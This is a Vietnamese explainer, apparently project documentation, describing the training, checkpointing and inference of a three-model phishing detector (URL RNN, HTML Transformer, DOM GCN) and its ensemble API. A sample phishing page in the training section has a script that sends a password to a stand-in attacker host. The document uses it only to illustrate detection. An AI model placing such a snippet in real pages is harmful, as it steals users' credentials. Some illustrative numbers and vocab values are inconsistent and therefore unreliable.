# 🎓 Từ Training Đến Inference: Giải Thích Chi Tiết

## 📊 **Tổng Quan Quy Trình**

```
┌─────────────────────────────────────────────────────────────────┐
│                    TRAINING PHASE (Offline)                     │
├─────────────────────────────────────────────────────────────────┤
│ 1. Chuẩn bị dữ liệu (URL, HTML, DOM)                           │
│ 2. Xây dựng mô hình neural network                             │
│ 3. Training trên GPU (hàng giờ/ngày)                           │
│ 4. Lưu checkpoint: weights + biases + metadata                 │
│ 5. Lưu artifacts: vocab, thresholds, evaluation metrics        │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│          CHECKPOINT FILES (Những gì được lưu trong CKPT/)       │
├─────────────────────────────────────────────────────────────────┤
│ ✓ rnn_best_ema.pt                  → Weights của RNN model      │
│ ✓ transformer_byte_best.pt         → Weights của Transformer   │
│ ✓ gnn_best.pt                      → Weights của GCN           │
│ ✓ rnn_url_vocab.json               → Cách encode URL           │
│ ✓ gnn_tag_vocab.json               → Cách encode DOM tags      │
│ ✓ *_best_threshold.json            → Decision boundary         │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│             INFERENCE PHASE (Real-time, Online)                │
├─────────────────────────────────────────────────────────────────┤
│ 1. User nhập URL/HTML                                          │
│ 2. Load checkpoint vào memory                                  │
│ 3. Preprocess input (encode, tokenize, padding)               │
│ 4. Forward pass qua neural network                            │
│ 5. Get output probability                                     │
│ 6. Compare với threshold → Phishing / Benign                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔍 **Chi Tiết: Mỗi Model Hoạt Động Như Thế Nào**

### **1️⃣ RNN URL Model**

#### **Training Phase:**
```python
# TRAINING (Lúc training - lâu, tốn công)
# Input: URL strings (e.g., "https://evil.com/login")
# Output: Nhãn (0=BENIGN, 1=PHISHING)

training_data = [
    ("https://paypal.com", 0),           # BENIGN
    ("https://pay-pal-verify.tk", 1),   # PHISHING
    ("https://amazon.com", 0),          # BENIGN
    ("https://amaz0n-verify.cf", 1),    # PHISHING
    ...
]

# Model học pattern từ hàng triệu URLs
# Nó học được rằng:
# - ".tk", ".ml", ".ga", ".cf" TLDs → phishing
# - Hyphens ("-") trong domain → phishing
# - Free hosts (firebase.com) → phishing
# - Typosquatting patterns → phishing

# Lưu kết quả training:
model.state_dict() → rnn_best_ema.pt  (weights + biases)
vocab              → rnn_url_vocab.json (character mapping)
threshold          → rnn_best_threshold.json (cutoff point)
```

#### **Inference Phase (Real-time):**
```python
# INFERENCE (Khi user nhập URL)

# Step 1: Load checkpoint
checkpoint = torch.load("rnn_best_ema.pt")      # Weights
vocab = json.load("rnn_url_vocab.json")         # Encoding
threshold = json.load("rnn_best_threshold.json") # Cutoff

# Step 2: Khởi tạo model với cấu trúc tương tự
model = GRUUrl(
    vocab_size=87,      # Từ vocab size
    emb_dim=64,
    hidden_dim=128,
    num_layers=1,
    bidir=True
)

# Step 3: Load weights từ checkpoint
model.load_state_dict(checkpoint)  # ← Copy learned weights vào model
model.eval()                        # ← Set to inference mode

# Step 4: Preprocess input URL
input_url = "https://suspicious-site.tk/login"
encoded = encode_url(input_url, vocab, max_len=256)
# "https://suspicious-site.tk/login"
#  ↓↓↓↓↓ (mỗi ký tự → number từ vocab)
# [54, 23, 12, 45, 23, 12, 45, ...]

# Step 5: Forward pass
with torch.no_grad():  # ← Không cần gradients (chỉ inference)
    logits = model(torch.tensor(encoded))
    # Output từ model: [0.2, 3.5]
    # logits[0] = score cho BENIGN
    # logits[1] = score cho PHISHING
    
    probs = softmax(logits)
    # probs[0] = 0.05  (5% BENIGN)
    # probs[1] = 0.95  (95% PHISHING)
    
    p_phishing = probs[1].item()  # 0.95

# Step 6: Decision
if p_phishing >= threshold (0.5):
    verdict = "PHISHING" ✓
else:
    verdict = "BENIGN"
```

**Ví dụ cụ thể:**
```
INPUT: "https://paypal-verify.tk"
       ↓ (encode qua vocab)
TENSOR: [54, 23, 12, 45, ..., 256, 256]  (256 = padding)
        ↓ (forward pass)
LOGITS: [0.1, 2.8]
        ↓ (softmax)
PROBS:  [0.05, 0.95]
        ↓ (compare với threshold 0.5)
OUTPUT: 0.95 > 0.5 → "PHISHING" ✅
```

---

### **2️⃣ Transformer HTML Model**

#### **Training Phase:**
```python
# Input: HTML content
html_benign = """
<html>
  <head><title>PayPal Login</title></head>
  <body>
    <form action="/login">
      <input type="email" name="email">
      <input type="password" name="password">
    </form>
  </body>
</html>
"""

html_phishing = """
<html>
  <body>
    <form action="http://attacker.com/steal">
      <input type="hidden" name="secret">
      <input type="password" name="password">
      <script>fetch('https://attacker.com?pwd='+pwd)</script>
    </form>
  </body>
</html>
"""

# Model học patterns như:
# - Multiple forms → phishing
# - Hidden fields → phishing
# - JavaScript logging → phishing
# - External form action → phishing
```

#### **Inference Phase:**
```python
# Step 1: Load checkpoint
checkpoint = torch.load("transformer_byte_best.pt")
# BYTE-level encoding (0-255 ascii codes)

# Step 2: Khởi tạo model
model = ByteTransformer(
    vocab_size=259,  # 256 bytes + 3 special tokens
    d_model=256,
    n_head=8,
    n_layers=6
)
model.load_state_dict(checkpoint)
model.eval()

# Step 3: Preprocess HTML
html = fetch_html(url)  # Fetch từ server
encoded = encode_html_bytes(html)
# "<!doctype html><head>...</head>" 
#  ↓ (convert each char to byte)
# [60, 33, 100, 111, 99, 116, 121, 112, 101, ...]

# Step 4: Multi-window inference (vì HTML dài)
# HTML có thể 10,000+ bytes nhưng model max 1024
# → Chia thành windows, chạy model on each, average
p_phishing = infer_multi(html, max_windows=4)

OUTPUT: 0.72 → "PHISHING" ✅
```

---

### **3️⃣ GCN DOM Model**

#### **Training Phase:**
```python
# Input: DOM tree structure
# Ví dụ:
# html
#  ├── head
#  │    └── title
#  ├── body
#  │    ├── form (action="http://attacker.com")
#  │    │   ├── input (type=email)
#  │    │   └── input (type=password)
#  │    └── script

# Graph:
# Nodes: [html, head, title, body, form, input, input, script]
# Edges: [parent-child relationships]

# Model learns:
# - Form + password inputs → phishing
# - External form action → phishing
# - Script tags → phishing
```

#### **Inference Phase:**
```python
# Step 1: Load checkpoint
checkpoint = torch.load("gnn_best.pt")

# Step 2: Build model
model = GCNClassifier(
    input_dim=64,      # Tag embedding
    hidden_dim=128,
    n_layers=2
)
model.load_state_dict(checkpoint)
model.eval()

# Step 3: Parse HTML → DOM tree
from lxml import html as lxml_html
tree = lxml_html.fromstring(html_content)

# Step 4: Extract DOM features
nodes = extract_dom_nodes(tree)
edges = extract_dom_edges(tree)
# nodes: ["html", "head", "body", "form", ...]
# edges: [(0,1), (0,2), (3,4), (3,5), ...]

# Step 5: Encode nodes
encoded_nodes = encode_dom_tags(nodes, tag_vocab)
# ["html", "form", "input"] → [[12, 0, 0], [34, 0, 0], [45, 0, 0]]

# Step 6: Forward pass
with torch.no_grad():
    logits = model(
        node_features=encoded_nodes,
        edges=edges
    )
    probs = softmax(logits)
    p_phishing = probs[1].item()

OUTPUT: 0.58 → "PHISHING" ✅
```

---

## 🧠 **Khái Niệm Chính**

### **Checkpoint = "Bộ não" đã qua training**

```
checkpoint .pt file = {
    "model weights":  [
        layer1: [[0.123, 0.456, ...], [0.789, ...]],
        layer2: [[0.234, 0.567, ...], [0.890, ...]],
        ...
    ],
    "model biases": [0.012, 0.034, ...],
    "other parameters": {...}
}
```

**Ví dụ analogy:**
- Training: Bạn học tiếng Anh trong 1 năm (hàng trăm giờ học)
- Checkpoint: Lưu lại "kiến thức" vào ổ cứng (chứng chỉ, ghi chú)
- Inference: Bạn đọc tiếng Anh (nhanh, không cần học lại)

### **Vocab = Từ điển encoding**

```python
# URL Vocab ví dụ
vocab = {
    'h': 1,
    't': 2,
    'p': 3,
    's': 4,
    ':': 5,
    '.': 6,
    't': 7,
    'k': 8,
    ...
}

# "https://paypal.tk"
#  ↓ (map qua vocab)
# [3, 2, 7, 4, 1, 6, 21, 22, 23, 6, 7, 8]
```

### **Threshold = Decision boundary**

```python
# Model output: probability (0.0 - 1.0)
# Threshold: cutoff point (thường 0.5)

prob = 0.85
threshold = 0.5

if prob >= threshold:
    verdict = "PHISHING"  ← confidence
else:
    verdict = "BENIGN"
```

---

## 🔄 **Quy Trình Toàn Bộ Trong Code**

```python
# FILE: backend/main.py

@app.post("/api/analyze_url_full")
async def analyze_url_full(request: AnalysisRequest):
    url = request.url
    
    # 1️⃣ RNN URL Model
    url_prob, url_label = url_model.infer(url)
    #                      ↓
    #   1. encode_url(url, vocab) → tensor
    #   2. model.forward(tensor) → logits
    #   3. softmax(logits) → probs
    #   4. compare probs[1] vs threshold
    
    # 2️⃣ Transformer HTML Model
    html = fetch_html(url)
    html_prob, html_label = html_model.infer_multi(html)
    #                       ↓
    #   1. encode_html_bytes(html) → tensor
    #   2. model.forward(tensor) → logits
    #   3. average across windows
    #   4. softmax(logits) → probs
    
    # 3️⃣ GCN DOM Model
    dom_record = parse_dom(html)
    dom_prob, dom_label = dom_model.infer(dom_record)
    #                     ↓
    #   1. parse_html_to_tree(html) → graph
    #   2. encode_dom_tags(graph) → tensor
    #   3. model.forward(graph) → logits
    #   4. softmax(logits) → probs
    
    # 4️⃣ Ensemble
    ensemble_prob = weighted_ensemble([
        (url_prob, 0.60),    # RNN weight 60%
        (html_prob, 0.20),   # Transformer weight 20%
        (dom_prob, 0.20)     # GCN weight 20%
    ])
    
    return {
        "url_model": {..., "probability": url_prob},
        "html_model": {..., "probability": html_prob},
        "dom_model": {..., "probability": dom_prob},
        "ensemble": {..., "probability": ensemble_prob}
    }
```

---

## 📈 **Performance Breakdown**

| Giai Đoạn | Thời Gian | CPU/GPU | Chi Phí |
|----------|-----------|---------|--------|
| **Training** | Hàng giờ/ngày | GPU (bắt buộc) | Cao |
| **Save Checkpoint** | < 1 giây | CPU/Disk | Thấp |
| **Load Checkpoint** | ~ 0.5 giây | CPU (memory) | Thấp |
| **Inference (1 URL)** | 50-200ms | CPU/GPU | Thấp |
| **Inference (batch 100)** | 2-5 giây | CPU/GPU | Thấp |

---

## 🎯 **Tóm Tắt**

1. **Training** (offline, lâu):
   - Dùng GPU, hàng triệu dữ liệu
   - Lưu weights → `.pt` checkpoint

2. **Checkpoint** (file nhỏ, tĩnh):
   - Chứa learned knowledge
   - Có thể copy, backup, deploy

3. **Inference** (online, nhanh):
   - Load checkpoint vào memory
   - Preprocess user input
   - Forward pass → prediction
   - Return result

4. **Một checkpoint = Một mô hình hoàn chỉnh**
   - Không cần dữ liệu training
   - Không cần training lại
   - Chỉ cần 1 dòng code: `model.load_state_dict(checkpoint)`

---

## 🚀 **Ví Dụ Thực Tế**

```python
# User nhập URL vào frontend
input_url = "https://verify-paypal-account.tk/login"

# Backend nhận request
@app.post("/api/analyze_url_full")
async def analyze(request: AnalysisRequest):
    
    # Model 1: RNN
    # "verify-paypal-account.tk" → weights học từ 200K URLs
    #  - .tk TLD? → +0.3 phishing score
    #  - hyphen? → +0.2 phishing score
    #  - "paypal" typo? → +0.25 phishing score
    #  - total = 0.95 probability
    url_prob = 0.95
    
    # Model 2: Transformer
    # HTML content → check for forms, scripts, etc
    # Kết quả: 0.72
    html_prob = 0.72
    
    # Model 3: GCN
    # DOM tree → check for suspicious structure
    # Kết quả: 0.68
    dom_prob = 0.68
    
    # Ensemble (weighted)
    # 0.95*0.6 + 0.72*0.2 + 0.68*0.2 = 0.83
    ensemble_prob = 0.83
    
    return {
        "ensemble": {
            "label": "PHISHING",
            "probability": 0.83
        }
    }
```

---

## ❓ **Câu Hỏi Thường Gặp**

### Q: Tại sao checkpoint nhỏ nhưng có thể đánh giá hàng triệu URLs?

**A:** Checkpoint chứa "pattern knowledge". Model học cách nhận dạng patterns (typosquatting, phishing indicators), không cần lưu toàn bộ training data.

### Q: Nếu load một checkpoint sai có sao không?

**A:** Kết quả sẽ sai. Nhưng checkpoint được checksummed, và code check model architecture trước load.

### Q: Có thể inference mà không load checkpoint?

**A:** Không, cần checkpoint để có weights. Model mới sẽ random weights → dự đoán ngẫu nhiên.

### Q: Checkpoint có phụ thuộc vào OS không?

**A:** Không, PyTorch checkpoints portable across OS (Windows/Linux/Mac).

